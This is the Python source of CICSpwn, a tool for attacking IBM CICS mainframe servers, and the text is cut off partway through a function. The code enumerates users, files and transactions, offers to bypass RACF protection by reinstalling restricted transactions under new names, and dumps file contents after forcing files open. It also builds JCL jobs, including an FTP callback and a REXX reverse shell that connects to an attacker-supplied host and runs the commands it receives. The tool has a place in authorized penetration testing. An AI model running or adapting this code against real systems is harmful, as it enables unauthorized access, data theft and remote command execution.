# -*- coding: utf-8 -*-

import os
import re
import sys
import socket
import time
import datetime
import string
import random
import platform
from random import randrange
import signal
import argparse
from time import sleep
import threading

import py3270
from py3270 import Emulator,CommandError,FieldTruncateError,TerminatedError,WaitError,KeyboardStateError,FieldTruncateError,x3270App,s3270App


####################################################################################
#			              *******  CICSpwn  ********                             
####################################################################################
#
# CICSpwn is a tool to pentest CICS servers by abusing IBM Supplied transactions 
# Code execution, file reading, information gathering..all the good stuff      
#                                                                              
# Refer to https://github.com/ayoul3                                   
# Requirements for JCL submission :
#        SPOOL=YES in SIT table
#        Or TDQueue pointing to INTRDR (which was defined in CICS start up JCL)
#        Record length of the JCL must not exceed 80 characters 
#
# Example of TSO commands : LU (display user privileges)                                                           
# Created by: Ayoul3 (@ayoul3__              	
# Credit for the reverse shell goes to @mainframed767 (https://github.com/mainframed)
# Copyright GPL 2016                                             	  
#####################################################################################


TRAN_NUMBER = 1000
SLEEP = 0.5
AUTHENTICATED = False
DO_AUTHENT = False
CECI = "CECI"
CEMT = "CEMT"

# TO DO:


#   Check access to files and transactions
#   Query security with any class and resource
#   Distinguish VTAM authentication from CICS authentication
#   Write a CICS SHELL in COBOL
#   CEDA VIEW CON
#   CEDA install files and transactions
#   C file



class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    CYAN="\033[36m"
    PURPLE="\033[35m"
    WHITE=""
    DARKGREY = '\033[1;30m'
    DARKBLUE = '\033[0;34m'

    def disable(self):
        self.HEADER = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''

# Override some behaviour of py3270 library
class EmulatorIntermediate(Emulator):
	def __init__(self, visible=True, delay=0):
		Emulator.__init__(self, visible)
		self.delay = delay

	def send_enter(self): # Allow a delay to be configured
		self.exec_command('Enter')
		if self.delay > 0:
			sleep(self.delay)
    
	def send_clear(self): # Allow a delay to be configured
		self.exec_command('Clear')
		if self.delay > 0:
			sleep(self.delay)
            
	def send_eraseEOF(self): # Allow a delay to be configured
		self.exec_command('EraseEOF')
		if self.delay > 0:
			sleep(self.delay)
      
	def send_pf11(self):
		self.exec_command('PF(11)')
            
	def screen_get(self):
		response = self.exec_command('Ascii()')
		if ''.join(response.data).strip() == "":
		    sleep(0.3)
		    return self.screen_get()
		return response.data

	# Send text without triggering field protection
	def safe_send(self, text):
		for i in xrange(0, len(text)):
			self.send_string(text[i])
			if self.status.field_protection == 'P':
				return False # We triggered field protection, stop
		return True # Safe

	# Fill fields in carefully, checking for triggering field protections
	def safe_fieldfill(self, ypos, xpos, tosend, length):
		if length - len(tosend) < 0:
			raise FieldTruncateError('length limit %d, but got "%s"' % (length, tosend))
		if xpos is not None and ypos is not None:
			self.move_to(ypos, xpos)
		try:
			self.delete_field()
			if safe_send(self, tosend):
				return True # Hah, we win, take that mainframe
			else:
				return False # we entered what we could, bailing
		except CommandError, e:
			# We hit an error, get mad
			return False
			# if str(e) == 'Keyboard locked':

	# Search the screen for text when we don't know exactly where it is, checking for read errors
	def find_response(self, response):
		for rows in xrange(1,int(self.status.row_number)+1):
			for cols in xrange(1, int(self.status.col_number)+1-len(response)):
				try:
					if self.string_found(rows, cols, response):
						return True
				except CommandError, e:
					# We hit a read error, usually because the screen hasn't returned
					# increasing the delay works
					sleep(self.delay)
					self.delay += 1
					whine('Read error encountered, assuming host is slow, increasing delay by 1s to: ' + str(self.delay),kind='warn')
					return False
		return False
	
	# Get the current x3270 cursor position
	def get_pos(self):
		results = self.exec_command('Query(Cursor)')
		row = int(results.data[0].split(' ')[0])
		col = int(results.data[0].split(' ')[1])
		return (row,col)

	def get_hostinfo(self):
		return self.exec_command('Query(Host)').data[0].split(' ')

class ThreadListen(threading.Thread):
    """Threaded client connection for reverse REXX"""
    
    def __init__(self, port, payload):
        threading.Thread.__init__(self)
        self.port = port
        self.payload = payload
    def run(self):
        #~ print tran + ": " + str(threading.current_thread())
        try:
            whine('Started a listener on port '+str(self.port),'info')     
            serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            serversocket.bind(('', self.port))
            serversocket.listen(5)
            connection, address = serversocket.accept()
            rc =  connection.send(self.payload)
            if rc > 0:
                whine('Payload delivered ('+str(rc)+' bytes)','good') 
            else:
                whine('Payload could not be delivered','err') 
        except Exception, e:
            pass


def logo():

  print bcolors.BLUE + '''
  
       ::::::::   :::::::::::   ::::::::    ::::::::   ::::::::: :::       :::::::    ::: 
      :+:    :+:      :+:      :+:    :+:  :+:    :+:  :+:    :+::+:       :+::+:+:   :+: 
      +:+             +:+      +:+         +:+         +:+    +:++:+       +:+:+:+:+  +:+ 
      +#+             +#+      +#+         +#++:++#++  +#++:++#+ +#+  +:+  +#++#+ +:+ +#+ '''+bcolors.DARKBLUE+''' 
      +#+             +#+      +#+                +#+  +#+       +#+ +#+#+ +#++#+  +#+#+# 
      #+#    #+#      #+#      #+#    #+#  #+#    #+#  #+#        #+#+# #+#+# #+#   #+#+# 
       ########   ###########   ########    ########   ###         ###   ###  ###    #### 
      
                            The tool for some CICS p0wning !\t\tAuthor: @Ayoul3__\n'''+ bcolors.ENDC
  
def signal_handler(signal, frame):
        print 'Done !'
        sys.exit(0)

def printProgress (iteration, total, prefix = '', suffix = '', decimals = 1, barLength = 100):
    """
    Call in a loop to create terminal progress bar
    @params:
        iteration   - Required  : current iteration (Int)
        total       - Required  : total iterations (Int)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        barLength   - Optional  : character length of bar (Int)
    """
    formatStr       = "{0:." + str(decimals) + "f}"
    percents        = formatStr.format(100 * (iteration / float(total)))
    filledLength    = int(round(barLength * iteration / float(total)))
    bar             = '*' * filledLength + ' ' * (barLength - filledLength)
    #bar             = '█' * filledLength + '-' * (barLength - filledLength)
    sys.stdout.write('\r\t%s|%s| %s%s %s' % (prefix, bar, percents, '%', suffix)),
    sys.stdout.flush()
    if iteration == total:
        sys.stdout.write('\n')
        sys.stdout.flush()
          
def rand_name(size=8, chars=string.ascii_letters):
	return ''.join(random.choice(chars) for x in xrange(1, size))
  
def format_request(request):
    i =0
    while i + len(request) < 80:
       request +=" "
    
    return request

def show_screen():
    data = em.screen_get()
    for d in data:
        print d
        
def whine(text, kind='clear', level=0):
  """
    Handles screen messages display
  """
  typdisp = ''
  lvldisp = ''
  color =''
  if kind == 'warn': typdisp = '[!] ';color=bcolors.YELLOW
  elif kind == 'info': typdisp = '[+] ';color=bcolors.WHITE
  elif kind == 'err': typdisp = '[#] ';color=bcolors.RED
  elif kind == 'good': typdisp = '[*] ';color=bcolors.GREEN
  if level == 1: lvldisp = "\t"
  elif level == 2: lvldisp = "\t\t"
  elif level == 3: lvldisp = "\t\t\t"
  print color+lvldisp+typdisp+text+ (bcolors.ENDC if color!="" else "")

def connect_zOS(target):
    """
    Connects to z/OS server. If Port 992 is used, instructs 3270 to use SSL
    """
    whine('Connecting to target '+target,kind='info')
    if "992" in target or "10024" in target:
        em.connect('L:'+target)
    else:
        em.connect(target)
    em.send_enter()
    if not em.is_connected():
        whine('Could not connect to ' + target + '. Aborting.',kind='err')
        sys.exit(1)

def do_authenticate(userid, password, pos_pass):
   """
       It starts writting the userid, then moves to pos_pass to write the password
       Works for VTAM and CICS authentication
   """
   
   posx, posy = em.get_pos()
      
   em.safe_send(results.userid)   
         
   em.move_to(pos_pass,posy+1)
   em.safe_send(results.password)
   em.send_enter()
  
   data = em.screen_get()
   if any("Your userid is invalid" in s for s in data):
      whine('Incorrect userid information','err')
      sys.exit()
   elif any("Your password is invalid" in s for s in data):
      whine('Incorrect password information','err')
      sys.exit()
    
def check_valid_applid(applid, do_authent, method = 1):
    """
       Tries to access a CICS app in VTAM screen. If VTAM needs
       authentication, it calls do_authenticate()
       If CICS appid is valid, it tries to access the CICS terminal
    """
    
    em.send_string(applid) #CICS APPLID in VTAM
    em.send_enter()   
    sleep(SLEEP)
    
    if do_authent:
        pos_pass=1;
        data = em.screen_get()   
        for d in data:
            if "Password" in d or "Code" in d or "passe" in d:
                break;
            else:
               pos_pass +=1
            if pos_pass > 23:
                whine("Could not find a password field. Was looking for \"password\", \"code\" or \"pass\" strings",'err')
                sys.exit();
        
        do_authenticate(results.userid, results.password, pos_pass)
        whine("Successful authentication",'good')
    
    if method ==1:
      em.send_clear()
      
    if method ==3:
      em.send_pf3()
      sleep(SLEEP)
      em.send_clear()
            
    if method ==2:
      em.send_clear()
      sleep(SLEEP)
      em.send_clear()    
      
    em.move_to(1,1)  
    #em.send_string('CESF') #CICS CESF is the Signoff command
    em.send_pf3()
    em.send_enter()
    sleep(SLEEP)
    
    if em.find_response( 'DFHAC2001'):
        whine('Access to CICS Terminal is possible with APPID '+applid,'good')
        em.send_clear()
        return True
    elif method > 2:
        return False
    else:
        method += 1
        whine('Returning to CICS terminal via method '+str(method),kind='info')
        return check_valid_applid(applid, do_authent, method)

def query_cics(request, verify, line):
    """
      Function to send a request to CICS and see if it worked.
      It does not support double send (required for CECI)
    """
    
    em.move_to(1,2)
    em.safe_send(format_request(request))
    em.send_enter()
        
    data = em.screen_get()
    if verify in data[line-1].strip():
        return True
    else:
        return False

def get_cics_value(request, identifier, double_enter=False):
    """
      Send a request to CICS, stores the result in a variable then returns it
      supports double send required by CECI
    """
    em.move_to(1,2)
    for i in identifier:
        request += " "+i+"(&"+i[:3]+")"
    if len(request) > 79:
        whine("Request longer than terminal screen",'err')
        sys.exit()
    
    em.safe_send(format_request(request))
    em.send_enter()
    
    if double_enter:
        em.send_enter()
    
    sleep(SLEEP)
    em.send_pf5()
    data = em.screen_get()
    j=5; out = []
    for i in identifier :
       out.append(data[j][23:].strip())
       j+=1
    
    em.send_pf3()
    return out;

def query_cics_scrap(request, pattern, length, depth, scrolls):
    """
      Sometimes values cannot be stored in variables, so we need to scrap
      the screen to get their values.
      @pattern: pattern preceding the value
      @length: length of the value retrieved
      @depth : click on the value to get more details 
      @scrolls: how many F11 before getting the pattern on screen
    """
    em.move_to(1,2)
    
    em.safe_send(format_request(request))
    em.send_enter()
    out = []
    i =0;
    
    if depth == 1:
       em.move_to(3,7)
       em.send_enter()
        
    while i < scrolls:
        em.send_pf11()
        i +=1;
    data = em.screen_get()
        
    if "NOT AUTHORIZED" in data[2]:
        whine (request+" not authorized", 'err')
        return None
        
    for d in data:
       if pattern in d:
           pos= d.find(pattern) + len(pattern)
           if d[pos:pos+length].strip() in out:
              continue;
           out.append(d[pos:pos+length].strip().replace(")",""))
    
    em.send_pf3()
    if len(out) > 0:
      return '\n'.join(out)
    else:
      return None;    

def send_cics(request, double=False):
    """
      Sends request to CICS
      handles double send required by CECI
    """
    
    #em.send_clear()
    #data = em.screen_get()
    
    em.move_to(1,2)
    em.safe_send(format_request(request))
    em.send_enter()
    
    if double:
       em.send_enter()
    data = em.screen_get()
    
    if "RESPONSE: NORMAL" in data[22]:
        return True
    else:
        whine('Error:' + data[22],'err')
        return False

def get_hql_files():
    """
      Called by get_infos(). retrieves the HLQ of files handled by CICS
    """
    
    em.move_to(1,2)
    
    em.safe_send(format_request(CEMT+" I DSNAME"))
    em.send_enter()
    
    data = em.screen_get()
    for d in data:
       if "Dsn" in d and "(DFH" not in d:
           pos= d.find("Dsn(") + len("Dsn(")
           dataset =  d[pos:pos+44].strip()
           em.send_pf3()
           return dataset[:dataset.rfind(".")]+".**"
    
    em.send_pf3()
    return None
    
def get_hql_libraries():
    """
      Called by get_infos(). retrieves the HLQ of CICS install libraries
    """
    found_dfhrpl= False;
    em.move_to(1,2)
    
    em.safe_send(format_request(CEMT+" I LIBRARY"))
    em.send_enter()
    
    data = em.screen_get()
    for d in data:
       if "DFHRPL" in d:
           found_dfhrpl=True;
           continue
       if found_dfhrpl:
           pos= d.find("(") + len("(")
           dataset =  d[pos:pos+44].strip()
           em.send_pf3()
           return dataset[:dataset.rfind(".")]+".**"
    
    em.send_pf3()
    return None

def get_users():
    """
      Called by get_infos(). retrieves active users
    """
    out = []
    em.move_to(1,2)

    em.safe_send(format_request(CEMT+" I TASK"))
    em.send_enter()
    
    data = em.screen_get()
    if "NOT AUTHORIZED" in data[2]:
        whine ("CEMT I TASK not authorized", 'err')
        return None
        
    for d in data:
       if "Use" in d:
           pos= d.find("Use(") + len("Use(")
           out.append(d[pos:pos+8].strip())
    
    em.send_pf3()
    return out

def get_version():
   """
      Called by get_infos(). retrieves current version of CICS
    """
   version = query_cics_scrap(CEMT+" I SYS", "Cicstslevel(", 8, 0, 0 )
   if version:
     version = version.strip("0").replace("0",".")
   return version
        
def get_default_user():
   """
      Called by get_infos(). retrieves the default pre auth user
    """
   default_user = query_cics_scrap(CEMT+" I SYS", "Dfltuser(", 8, 0, 0 )
   return default_user     
        
def get_max_tasks():
   """
      Called by get_infos(). retrieves the maximum number of concurrent tasks
    """
   default_user = query_cics_scrap(CEMT+" I SYS", "Maxtasks( ", 3, 0, 0 )
   return default_user     

def activate_supplied(old_name, old_group, new_name, new_group):
    global CECI
    global CEMT
    
    em.move_to(1,2)
    req_copy ="CEDA COPY TRANS("+old_name.upper()+") GROUP("+old_group.upper()+") AS("+new_name.upper()+") TO("+new_group.upper()+")"
    em.safe_send(format_request(req_copy));
    em.send_enter();
    
    data = em.screen_get();
        
    if "already exists" in data[20]:
        whine("Already copied "+old_name.upper()+" to "+new_name.upper()+" in group "+old_group.upper(),"info")
        
    
    elif not "COPY SUCCESSFUL" in data[22]:
        whine('Could not copy '+old_name.upper()+' to a new transaction name '+new_name.upper()+' in group '+new_group.upper(),'err')
        whine(data[22],'err')
        return False
    else:
        whine(old_name.upper()+' successfully copied to '+new_name.upper(),'good')
    em.move_to(1,2)
    req_install ="INSTALL TRANS("+new_name.upper()+") GROUP("+new_group.upper()+")"
    em.safe_send(format_request(req_install));
    em.send_enter();
    data = em.screen_get();
    
    if not "INSTALL SUCCESSFUL" in data[22]:
        whine('Could not install new '+new_name.upper()+' transaction in group '+new_group.upper()+'','err')
        whine(data[22],'err')
        return False
    else:
        whine(new_name.upper()+' successfully installed','good')
        
    if old_name.upper()=="CECI":
        CECI = new_name.upper()
    if old_name.upper()=="CEMT":
        CEMT = new_name.upper()
    em.send_pf3()
    
    return True
    
def get_infos():
    """
      retrieves meaningful information about CICS
    """
    global CEMT
    global CECI
    is_cemt = False
    is_ceci = False
    is_cecs = False
    is_ceda = True
    is_cedf = True
    is_cebr = False
    userid = ''
    hlq_files = None
    hlq_libraries = None
    version = None
    spool, tdqueue, tdqueue2 = None, None,None
       
    whine("Interesting and available IBM supplied transactions: ", 'info')
    if query_cics('CEMT','Inquire',5):
      is_cemt = True
      em.send_pf3()
      whine("CEMT", 'good',1)
    
    if query_cics('CEDA','ALter',5):
      is_ceda = True
      em.send_pf3()        
      whine("CEDA", 'good',1)
    
    if query_cics('CECI','ACquire',5):
        is_ceci = True
        em.send_pf3()
        whine("CECI", 'good',1)
    if query_cics('CECS','ACquire',5):
        is_cecs = True
        em.send_pf3()
        whine("CECS", 'good',1)
    if query_cics('CEDF ,OFF','EDF MODE OFF',1):
        is_cedf = True
        em.send_pf3()
        whine("CEDF", 'good',1)
    if query_cics('CEBR','ENTER COMMAND',2):
        is_cebr = True
        em.send_pf3()
        whine("CEBR", 'good',1)
        
    em.send_clear()
    
        
    if not is_ceci and not is_ceda:
        whine("CECI is not available. Little information will be available on the system", 'err')
        
    if is_ceda and (not is_ceci or not is_cemt):
        whine("CECI or CEMT are not available. Little information will be available on the system", 'err')
        response = raw_input(bcolors.YELLOW+'[!] Try to bypass RACF protection ? Y/N [Y]: '+bcolors.ENDC)
        
        if response.upper() != "N":
            if not is_ceci and activate_supplied("CECI","DFHCOMP1","CSPK","BBBB") and query_cics(CECI,'ACquire',5):
                em.send_pf3()
                is_ceci = True
                whine("CECI is now available under the transaction name CSPK. Please specify --ceci=CSPK in every future command",'good')
            else:
                whine('Could not activate CECI','err');
            if not is_cemt and activate_supplied("CEMT","DFHCOMP3","CSPS","DDDD") and query_cics(CEMT,'Inquire',5):
                em.send_pf3()
                is_cemt = True
                whine("CEMT is available under the transaction name CSPS. Please specify --cemt=CSPS in every future command",'good')
    
    
    whine("General system information: ", 'info')
    version = get_version()
    if version :
       whine("CICS TS Version: "+version, 'good',1)
    
    default_user = get_default_user()
    
    if default_user :
       whine("CICS default user: "+default_user, 'good',1)
    
    max_tasks = get_max_tasks()
    if max_tasks:
        whine("CICS max tasks: "+max_tasks, 'good',1)
        
    variables = ["USERID", "SYSID","NET","NATl"]
    values = get_cics_value(CECI+' ASSIGN', variables, True)        
    userid = values[0]; sysid = values[1]; netname = values[2]; language = values[3]
       
    
    whine("Userid: "+userid,'good',1)
    whine("Sysid: "+sysid,'good',1)
    whine("LU session name: "+netname,'good',1)
    whine("language: "+language,'good',1)
    
    hlq_files = get_hql_files()
    hlq_libraries = get_hql_libraries()
    
    if hlq_files:
       whine("Files HLQ:\t"+hlq_files,'good',1)
    if hlq_libraries:
       whine("Library path:\t"+hlq_libraries,'good',1)
    
    whine("Active users", 'info')
    users = get_users()
    if users:
       for u in users:
           whine(u, 'good', 1)
    else:
        whine('No active user', 'info',1)
        
    whine("JCL Submission", 'info')
    if is_cemt:
        tdqueue = query_cics_scrap(CEMT+' INQUIRE TDQueue DDN (INREADER)', 'Tdq(', 4, 0, 0)
        tdqueue2 = query_cics_scrap(CEMT+' INQUIRE TDQueue DDN (INTRDR)', 'Tdq(', 4, 0, 0)
    
    
    if (tdqueue or tdqueue2 ) and (tdqueue !="*" or tdqueue2 !="*") and is_ceci:
        whine('Transiant queue to access spool is apparently available','good',1)
        whine('When submitting a job with TDQueue, provide the option --queue='+(tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')),'good',2)
    
    
    if is_ceci:
        spool = send_cics(CECI+' SpoolOpen OUTPUT USERID(INTRDR  ) NODE(LOCAL   )',True)
    
    if spool:
        whine('Access to the internal spool is apparently available','good',1)
              
    if not spool and not tdqueue:
        whine('No way to submit JCL through this CICS region','err',1)
    
    whine("Access control", 'info')
    
     
    variables = ["READ"]
    read = get_cics_value('QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
    read = ''.join(read)
    if read == "+0000000035":
        whine('CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID','good',1)
    else:
        whine('CICS uses an ESM (RACF/ACF2/TopSecret), might be tricky to access some functions','info',1)
    
    # add check for OMVS, SUPERUSER, SERVER, DAMON, etc.
    
    #whine("Connection information", 'info')       
    
    #DB2: authtype, connectst, db2release, db2id
    #ISC connections: bind securty, attachsec
    #MQ: ???        
   
def get_transactions(transid):
     """
        List enabled transactions available on CICS
     """
     em.send_clear()
     em.move_to(1,2)
     
     print "ID\tPROGRAM"
     em.safe_send(CEMT+' Inquire Trans('+transid+') en                                           ')
     em.send_enter()
     
     #sleep()
     number_tran = 0;
     more = True
     out = []
     while (more==True and number_tran < TRAN_NUMBER):
        more = False;
        data = em.screen_get()
        for d in data:
            if "Tra(" in d and "NOT FOUND" not in d:
                number_tran +=1;
                if (number_tran % 9) ==0 and d[1]=="+":
                    more = True
                    continue
                print d[7:11].strip() + "\t"+d[28:36].strip()
        
        if more:
            em.send_pf11()
      
     if number_tran == 0:
       whine('No transaction matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')

def get_tsqueues(tsqueue):
     """
        Get all tsqueues defined in CICS
     """ 
     em.send_clear()
     em.move_to(1,2)
          
     print "Tsqueue\tItems\tLength\tTransaction"
     
     em.safe_send(format_request(CEMT+' Inquire Tsq('+tsqueue+')'))
     em.send_enter()
     
     #sleep()
     number_tsq = 0;
     more = True
     
     while (more):
        more = False;
        data = em.screen_get()
        for d in data:
            if "Tsq(" in d and "NOT FOUND" not in d:
                number_tsq +=1;
                if (number_tsq % 9) ==0 and d[1]=="+":
                    more = True
                    continue
                    
                tsq_name = d[7:13].strip()
                tsq_items = d[29:34].strip()
                tsq_length = d[40:50].strip()
 
                out = tsq_name + "\t" + tsq_items +"\t" + tsq_length
            elif "Tra(" in d:
                tsq_tran = d[10:14]
                out += "\t"+ tsq_tran
                print out
                
        if more:
            em.send_pf11()
      
     if number_tsq == 0:
       whine('No tsq matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')
   
def get_files(filename):
     """
        Get all files defined in CICS
     """ 
     em.send_clear()
     em.move_to(1,2)
          
     print "FILE\tTYPE\tSTATUS\tREAD\tUPDATE\tDISP\tLOCATION"
     
     em.safe_send(format_request(CEMT+' Inquire File('+filename+')'))
     em.send_enter()
     
     #sleep()
     number_files = 0;
     more = True
     
     while (more==True and number_files < TRAN_NUMBER):
        more = False;
        data = em.screen_get()
        for d in data:
            if "Fil(" in d and "NOT FOUND" not in d:
                number_files +=1;
                if (number_files % 9) ==0 and d[1]=="+":
                    more = True
                    continue
                    
                file_name = d[7:15].strip()
                file_type = d[17:20].strip()
                file_status = d[21:24].strip()
                file_access_read = d[29:32].strip()
                file_access_update = d[33:36].strip()
                file_dsp = d[53:56].strip()
                out = file_name + "\t" + file_type +"\t" + file_status +"\t"+ file_access_read +"\t"+ file_access_update +"\t"+ file_dsp
            elif "Dsn(" in d:
                file_dsn = d[15:60]
                out += "\t"+ file_dsn
                print out
                
        if more:
            em.send_pf11()
      
     if number_files == 0:
       whine('No files matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')

def fetch_tsq_item(tsq_name, item):
    """
        Gets the record item in a temporary storage queue.
    """
    em.move_to(1,2)
    if item==1:
        req_read = CECI +'READQ TS QUEUE('+tsq_name.upper()+') ITEM('+str(item)+') INTO(&FI)'
    else:
        req_read = 'READQ TS QUEUE('+tsq_name.upper()+') ITEM('+str(item)+') INTO(&FI)'
        
    em.safe_send(req_read)
    em.send_enter()
    em.send_enter() # Send twice Enter to confirm transaction
    
    data = em.screen_get()
    if "NORMAL" not in data[22]:
        whine(data[22],'err')
        return -1    
    
    em.send_pf5()   # Access Variable definition
    
    data = em.screen_get()
    posx = 0     # localize the variable &FI
    i =0;
    for d in data:
        if "&FI" in d :
            posx = i
        i +=1    
        
    em.move_to(posx+1,2)
    
    em.send_enter()
    
    data = em.screen_get()
    out = ""
    for d in data:        
      if d.find("+00") < 5 and d.find("+00") > -1:
         out += d[10:]
    return out
    
def get_tsq_content():
    """
        If the file is closed or disabled, it activates it before retrieving its content
    """
    
    items=0;
    current_item = 1;
    em.move_to(1,2)
    
    if len(results.tsq_name) > 16:
       whine('TSQueue name cannot be over 16 characters, Name will be truncated','err')
    
    tsq_name = results.tsq_name[:16]
    
    
    ## get file properties ##
    req_list_file = CEMT+' I TSQ('+tsq_name.upper()+')'
    em.safe_send(format_request(req_list_file))
    em.send_enter()
    data = em.screen_get()
    for d in data:
       if tsq_name.upper() in d and "I TSQ" not in d:
          items = int(d[29:34].strip())
    
    if items ==0:
        whine("TSQueue "+tsq_name+" could not be found", 'err')
        sys.exit()
    
    
    em.send_pf3() 
    em.move_to(1,2)
    while current_item <= items:
       print fetch_tsq_item(tsq_name, current_item)
       current_item +=1

def fetch_content(filename, ridfld, keylength):
    """
        Gets the record ridfld in a file.
        ridfld is they index key in a VSAM file
    """
    em.move_to(1,2)
    
    if int(ridfld)==0:
        req_read = CECI+' READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
    else:
        req_read = 'READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
        
    em.safe_send(req_read)
    em.send_enter()
    em.send_enter() # Send twice Enter to confirm transaction
    
    data = em.screen_get()
    if "NORMAL" not in data[22]:
        whine(data[22],'err')
        sys.exit()   
    
    em.send_pf5()   # Access Variable definition
    
    data = em.screen_get()
    posx = 0     # localize the variable &FI
    i =0;
    for d in data:
        if "&FI" in d :
            posx = i
        i +=1    
        
    em.move_to(posx+1,2)
    
    em.send_enter()
    
    data = em.screen_get()
    out = ""
    for d in data:        
      if d.find("+00") < 5 and d.find("+00") > -1:
         out += d[11:]
    print out
    
    return out[0:keylength]
    
def get_file_content():
    """
        If the file is closed or disabled, it activates it before retrieving its content
    """
    file_enabled, file_readable, file_opened = False, False, False;
    keylength, recordsize = 0, 0
    em.send_clear()
    em.move_to(1,2)
    
    if len(results.filename) > 8:
       whine('Filename cannot be over 8 characters, Name will be truncated','err')
    
    filename = results.filename[:8]
    ridfld = "000000";
    
    ## get file properties ##
    req_list_file = CEMT+' I READ FI('+filename.upper()+')'
    em.safe_send(format_request(req_list_file))
    em.send_enter()
    data = em.screen_get()
    if "Ope " in data[2]:
        file_opened = True
    if "Ena " in data[2]:
        file_enabled = True
    if "Rea " in data[2]:
        file_readable = True
    if file_readable and file_enabled and file_opened:
        whine("File "+results.filename+" is enabled, open, and readable", 'good')
    else:
        whine("File "+results.filename+" is lacking attributes to be readable. Changing that via CEMT", 'info')
        em.move_to(1,2)
        req_set_file = 'Set READ FI('+filename.upper()+') ENA OPE'
        em.safe_send(format_request(req_set_file))
        em.send_enter()
        data = em.screen_get()
        if "NORMAL" in data[22]:
            whine("File "+results.filename+" is enabled, open, and readable", 'good')
        else:
            whine('Cannot change file attributes','err')
            whine(data[22],'err')
    # getting key length and record size. Can only do when then the file is enabled and opened
    em.move_to(1,2)
    req_list_file = 'I READ FI('+filename.upper()+')'
    em.safe_send(format_request(req_list_file))
    em.send_enter()
    
    # Display more info about the file
    em.move_to(3,5)
    em.send_enter()
    
    em.send_pf11()
    
    data = em.screen_get()
    for d in data:
        pos1 = d.find("Keylength( ")
        pos2 = d.find("Recordsize( ")
        if pos1 > -1:
            pos1 = pos1 + len("Keylength( ")
            keylength = int(d[pos1:pos1+3])
        if pos2 > -1:
            pos2 = pos2 + len("Recordsize( ")
            recordsize = int(d[pos2:pos2+5])
        
    if keylength != 0 and recordsize !=0:
        whine("Record size: "+str(recordsize)+"\tkeylength:"+str(keylength), 'good')
    else:
        whine("Could not get record size and keylength size, default values will be used (rsize = 80, klen=6)", 'err')
        keylength = 6
        recordsize = 80
    
    # Exit CEMT utility
    em.send_pf3()
    
    next_ridfld = 0;
    
    while int(next_ridfld) != -1 and int(next_ridfld) < 1000000:
       ridfld = next_ridfld
       
       next_ridfld = fetch_content(filename, ridfld, keylength)
       next_ridfld = format(int(next_ridfld)+1, "0"+str(keylength))
                
def dummy_jcl(lhost):
    """
        PoC that executes an FTP to verify Job submission and network filtering
    """
    if results.surrogat_user:
      job_card = '//CICSUSEA JOB (INTRDR),USER='+results.surrogat_user+',CLASS=A'      
    else:
      job_card = '//CICSUSEA JOB (INTRDR),CLASS=A'
      
    dummy_jcl = job_card+'''
//*
//STEP01 EXEC  PGM=IKJEFT01
//SYSTSPRT DD  SYSOUT=*
//SYSTSIN  DD *
 FTP '''+lhost.split(":")[0]+''' '''+lhost.split(":")[1]+'''
/*
//SYSIN    DD  DUMMY
/*EOF'''
    return dummy_jcl 
       
def dummy_jcl2(lhost):
    dummy = {}
    dummy[0] = '//CICSUSER JOB (INTRD1),CLASS=A'
    dummy[1]= '//*'
    dummy[2] = '//STEP01 EXEC  PGM=IKJEFT01'
    dummy[3] = '//SYSTSPRT DD  SYSOUT=*'
    dummy[4] = '//SYSTSIN  DD *'
    dummy[5] = 'FTP '+lhost.split(":")[0]+' '+lhost.split(":")[1]
    dummy[6] = '/*'
    dummy[7] = '//SYSIN    DD  DUMMY'
    dummy[8] = '/*EOF'
    
    
        
    for key in dummy:
      i = 0;
      while i < (80 - len(dummy[key])):
         dummy[key] = dummy[key] + str(" ")
    
    jcl = ""
    for key in dummy:
        jcl += dummy[key]
    
    return jcl
    
def reverse_jcl(lhost, username="CICSUSEC", kind="tso"):
  """
     JOB that writes a reverse shell in REXX to a temporary file CICSUSER.*
     then executes said file
  """
  if kind =="tso":
     prompt= "TSO > "
     cmd = "ADDRESS TSO do;"
  else:   
     prompt= "Shell > "
     cmd =  "CALL BPXWUNIX do,,out.;"
     
  job_name = username
  tmp = rand_name(randrange(3,7))
  whine('Payload set to reverse '+kind+' to '+lhost,'info')     
  
  if results.surrogat_user:
      whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
      job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
  else:
      job_card = '//'+job_name.upper()+' JOB (123456),CLASS=A'      
  
  jcl_code = job_card+"""
//CREATERX  EXEC PGM=IEBGENER
//SYSPRINT   DD SYSOUT=*
//SYSIN      DD DUMMY
//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
//SYSUT1     DD *
 /* REXX */rh='"""+lhost.split(":")[0]+"""';rp='"""+lhost.split(":")[1]+"""';nl ='25'x;
    t=SOCKET('INITIALIZE','CLIENT',2);t=SOCKET('SOCKET',2,'STREAM','TCP');
    parse var t socket_rc s . ; if socket_rc <> 0 then do
       t= SOCKET('TERMINATE');exit 1;end
       par1='SOL_SOCKET';t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
    t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On')
    t=SOCKET('SOCKETSETSTATUS','CLIENT');
    t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, '"""+prompt+"""')
  DO FOREVER
    g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;exit
 get_cmd:
 parse arg ss; sox = SOCKET('RECV',ss,10000);parse var sox s_rc;
 parse var sox s_rc s_data_len sd;cmd = DELSTR(sd, LENGTH(sd));return cmd
  INLIST: procedure
